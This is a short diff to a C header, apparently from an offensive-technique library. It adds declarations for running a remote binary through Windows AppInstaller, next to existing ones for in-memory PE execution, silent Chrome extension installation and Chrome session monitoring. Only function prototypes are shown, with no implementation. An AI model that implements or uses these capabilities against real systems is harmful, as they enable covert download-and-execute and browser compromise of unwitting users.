@@ -255,6 +255,8 @@ DWORD MpfComMonitorChromeSessionOnce(VOID);
 DWORD MpfExecute64bitPeBinaryInMemoryFromByteArrayNoReloc(_In_ PBYTE BinaryImage);
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR ExtensionIdentifier);
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
+BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
+BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
 
 
 
